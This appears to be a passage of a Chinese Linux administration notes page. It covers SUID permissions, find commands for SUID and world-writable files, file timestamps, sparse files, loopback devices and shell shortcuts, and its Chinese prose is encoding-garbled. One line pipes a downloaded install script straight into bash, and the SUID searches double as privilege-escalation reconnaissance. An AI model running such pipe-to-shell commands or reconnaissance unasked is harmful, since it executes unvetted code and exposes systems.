&lt;p>&lt;img src="https://mincodes.com/uploads/images/c1a662fe-36db-4c41-b98f-4c554cbc8cf4/Untitled.png" alt="">&lt;/p>
&lt;p>SUID (Set UID)æ˜¯Linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œå…¶åŠŸèƒ½ä¸ºç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œä¸ºè¿›ç¨‹æ—¶ï¼Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚ä½†æ˜¯SUIDæƒé™çš„è®¾ç½®åªé’ˆå¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,å¯¹äºéå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®SUIDæ²¡æœ‰ä»»ä½•æ„ä¹‰.&lt;/p>
&lt;p>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…ä¼šæš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™,ä¸”è¯¥æƒé™åªåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ. é€šä¿—çš„æ¥è®²,å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶&lt;code>ls&lt;/code>,å…¶å±ä¸»ä¸ºroot,å½“æˆ‘ä»¬é€šè¿‡érootç”¨æˆ·ç™»å½•æ—¶,å¦‚æœ&lt;code>ls&lt;/code>è®¾ç½®äº†SUIDæƒé™,æˆ‘ä»¬å¯åœ¨érootç”¨æˆ·ä¸‹è¿è¡Œè¯¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶,è¯¥è¿›ç¨‹çš„æƒé™å°†ä¸ºrootæƒé™.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è®¾ç½®SUIDä½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod u+s filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å»æ‰SUIDè®¾ç½®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod u-s filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ—å‡ºæ‰€æœ‰ SUID æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -user root -perm -4000 -print 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -user root -perm -4000 -exec ls -ldb &lt;span class="o">{}&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ—å‡ºæ‰€æœ‰ SGID æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -type f -perm -04000 -ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ—å‡ºæ‰€æœ‰å…¨å±€å¯å†™æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -perm -2 -type f -print
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ–‡ä»¶æ—¶é—´æˆ³">æ–‡ä»¶æ—¶é—´æˆ³&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>atime&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Access Time&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å‡ºäºæ€§èƒ½è€ƒè™‘ï¼Œä¸€èˆ¬ mount çš„æ—¶å€™ä¼šå¢åŠ å¦‚ä¸‹é€‰é¡¹ï¼Œå¯¼è‡´ atime è¡¨ç°å’Œé¢„æœŸä¸ä¸€è‡´ï¼š&lt;/p>
&lt;pre>&lt;code>- ``noatime`` Do not update the file access time when reading from a file
- ``relatime`` Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time.
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ls -lu&lt;/code> åˆ—å‡º atimeï¼Œ &lt;code>ls -ltu&lt;/code> æŒ‰ atime æ’åºï¼ˆæœ€è¿‘çš„æ’æœ€ä¸Šé¢ï¼‰&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>mtime&lt;/p>
&lt;ul>
&lt;li>Modify Timeï¼Œæœ€åä¸€æ¬¡ä¿®æ”¹æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰æˆ–è€…ç›®å½•ï¼ˆå†…å®¹ï¼‰çš„æ—¶é—´&lt;/li>
&lt;li>&lt;code>ls -l&lt;/code> &lt;code>ls -lt&lt;/code> é»˜è®¤ä½¿ç”¨ mtime&lt;/li>
&lt;li>&lt;code>cp&lt;/code> æ–‡ä»¶é»˜è®¤ä¼šæ”¹å˜ mtime + ctime&lt;/li>
&lt;li>&lt;code>cp -a&lt;/code> åªä¼šæ”¹å˜ ctimeï¼Œmtime ä¸å˜&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>ctime&lt;/p>
&lt;ul>
&lt;li>Change Timeï¼Œæœ€åä¸€æ¬¡æ”¹å˜æ–‡ä»¶ï¼ˆå±æ€§æˆ–æƒé™ï¼‰æˆ–è€…ç›®å½•ï¼ˆå±æ€§æˆ–æƒé™ï¼‰çš„æ—¶é—´&lt;/li>
&lt;li>&lt;code>ls -lc&lt;/code> &lt;code>ls -ltc&lt;/code> ä½¿ç”¨ ctime&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">stat filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sort by mtime&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -lt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sort by ctime&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -ltc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -alR &amp;gt; /path/to/timestamp_modification.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -alRc &amp;gt; /path/to/timestamp_creation.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ–‡ä»¶æ‰“æ´">æ–‡ä»¶æ‰“æ´&lt;/h2>
&lt;p>å¦‚ä½•åœ¨ä¸€ä¸ªå¤§æ–‡ä»¶ï¼ˆä¾‹å¦‚ &amp;gt;500Gï¼‰çš„å¼€å¤´ï¼Œé«˜æ•ˆçš„æ’å…¥ä¸€äº›å†…å®¹ï¼Ÿ&lt;/p>
&lt;p>å¦‚æœæ˜¯ Linuxe + ext4/XFSï¼Œå¯ä»¥è€ƒè™‘ç”¨ fallocate å‡½æ•°ï¼ŒFALLOC_FL_INSERT_RANGE æ ‡è®°ä½ã€‚&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://stackoverflow.com/questions/37882286/prepend-to-very-large-file-in-fixed-time-or-very-fast/37884191#37884191">https://stackoverflow.com/questions/37882286/prepend-to-very-large-file-in-fixed-time-or-very-fast/37884191#37884191&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å­ç›®å½•æŒ‰å ç”¨ç©ºé—´å¤§å°æ’åº&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">du -d &lt;span class="m">1&lt;/span> &lt;span class="p">|&lt;/span>sort -n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep -c &lt;span class="s1">&amp;#39;model name&amp;#39;&lt;/span> /proc/cpuinfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åœ¨ /bin æˆ–è€… /usr/sbin ä¸­è¿è¡Œï¼Œæœç´¢å“ªäº›ç¨‹åºä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strings * &lt;span class="p">|&lt;/span> grep tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹èµ„æºé™åˆ¶çš„è®¾ç½®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ulimit&lt;/span> -a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS ä¸Šï¼ŒLinux ä¸ä¸€æ ·ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>/Volumes/disk-1t/1.out &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/dev/zero &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m &lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">10000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/Volumes/disk-1t/1.out &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>/dev/null &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç›‘æ§ç£ç›˜ io æƒ…å†µï¼Œ-p æŒ‡å®š æŸä¸ªï¼ˆæˆ–æŸäº›ï¼‰ç£ç›˜&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iostat -x &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ˜¾ç¤ºå½“å‰æ—¶é—´é…ç½®ä¿¡æ¯&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">timedatectl show
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å°†æœ¬åœ°æ—¶é—´åŒæ­¥åˆ° rtc æ—¶é’Ÿï¼Œè§£å†³ Windows 10 çš„ç³»ç»Ÿæ—¶é—´ä¸å¯¹çš„é—®é¢˜ï¼ˆä¼šä¿®æ”¹é…ç½®æ–‡ä»¶/etc/adjtimeï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">timedatectl set-local-rtc &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># lazy umount&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">umount -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¸‹è½½è„šæœ¬å¹¶ç«‹å³æ‰§è¡Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl --compressed -o- -L https://yarnpkg.com/install.sh &lt;span class="p">|&lt;/span> bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ–‡ä»¶æ¢å¤åˆ°æŸä¸ª revision&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git checkout c5f567 -- file1/to/restore file2/to/restore
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ–‡ä»¶æ¢å¤åˆ°æŸä¸ª revision ä¹‹å‰çš„ 1 ä¸ªç‰ˆæœ¬&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git checkout c5f567~1 -- file1/to/restore file2/to/restore
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pgrep process-name
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pkill process-name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="loopback-device">loopback device&lt;/h2>
&lt;p>loopback device å¯ä»¥å°†æ–‡ä»¶ä½œä¸ºè®¾å¤‡æ¥æŒ‚è½½ï¼Œç±»ä¼¼äºè™šæ‹Ÿæœºçš„é•œåƒæ–‡ä»¶ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ›å»ºä¸€ä¸ªç¨€ç–æ–‡ä»¶ï¼ˆsparse fileï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/dev/zero &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>1.img &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> &lt;span class="nv">seek&lt;/span>&lt;span class="o">=&lt;/span>512M
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å°† 1.img è‡ªåŠ¨ç»‘å®šåˆ°ä¸€ä¸ªå¯ç”¨çš„ loop device&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -P, --partscanï¼šæ‰«æåˆ†åŒº&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo losetup -fP 1.img
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ—å‡ºå½“å‰çš„ loop devices&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">losetup
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ†åŒº&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo fdisk /dev/loop13
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ†åŒºä¹‹åå¯ä»¥çœ‹åˆ°åˆ†åŒºçš„è®¾å¤‡å·ï¼Œä¾‹å¦‚è¿™é‡Œä¸º /dev/loop13p1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å°†åˆ†åŒºæ ¼å¼åŒ–ä¸º ext4 æ–‡ä»¶ç³»ç»Ÿ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mkfs.ext4 /dev/loop13p1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŒ‚è½½ loop device&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mount /dev/loop13p1 /mount/point
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ é™¤ loopback device&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo umount /mount/point
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo losetup -d /dev/loop13p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç¨€ç–æ–‡ä»¶ï¼ˆsparse file) çš„ç‰¹ç‚¹:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ dd &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/dev/zero &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>sparse_file &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> &lt;span class="nv">seek&lt;/span>&lt;span class="o">=&lt;/span>512M
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0+0 records in
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0+0 records out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> bytes copied, 0.000138743 s, 0.0 kB/s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ ls -lh sparse_file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> user user 512M 2æœˆ &lt;span class="m">2&lt;/span> 22:36 sparse_file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ du -sh sparse_file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> sparse_file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -sï¼šæŸ¥çœ‹å®é™…åˆ†é…çš„å°ºå¯¸&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ ls -lhs sparse_file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> -rw-r--r-- &lt;span class="m">1&lt;/span> user user 512M 2æœˆ &lt;span class="m">2&lt;/span> 22:36 sparse_file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœå°† sparse file ä½œä¸ºé•œåƒæ–‡ä»¶æŒ‚è½½ï¼Œä¼šéšç€åœ¨è®¾å¤‡ä¸­æ–‡ä»¶çš„å†™å…¥ï¼Œé•œåƒæ–‡ä»¶çš„å°ºå¯¸æ‰ä¼šé€æ¸å¢å¤§ã€‚&lt;/p>
&lt;h2 id="å¸¸ç”¨-console-å¿«æ·é”®">å¸¸ç”¨ Console å¿«æ·é”®&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">å¿«æ·é”®&lt;/th>
&lt;th style="text-align:center">åŠ¨ä½œ&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">ctrl+l&lt;/td>
&lt;td style="text-align:center">æ¸…å±&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+d&lt;/td>
&lt;td style="text-align:center">é€€å‡ºshell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+u&lt;/td>
&lt;td style="text-align:center">æ¸…é™¤å…‰æ ‡ä¹‹å‰&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+k&lt;/td>
&lt;td style="text-align:center">æ¸…é™¤å…‰æ ‡ä¹‹å&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+w&lt;/td>
&lt;td style="text-align:center">æ¸…é™¤å…‰æ ‡ä¹‹å‰çš„ä¸€ä¸ªå•è¯&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+y&lt;/td>
&lt;td style="text-align:center">ç²˜è´´åˆšæ‰ctrl+u/k/wçš„å†…å®¹&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+t&lt;/td>
&lt;td style="text-align:center">äº¤æ¢æœ€åä¸¤ä¸ªå­—ç¬¦&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">esc+k&lt;/td>
&lt;td style="text-align:center">äº¤æ¢æœ€åä¸¤ä¸ªå•è¯&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">alt+f/ctrl+b&lt;/td>
&lt;td style="text-align:center">å‘å‰/åç§»åŠ¨ä¸€ä¸ªå•è¯&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl+f/ctrl+b&lt;/td>
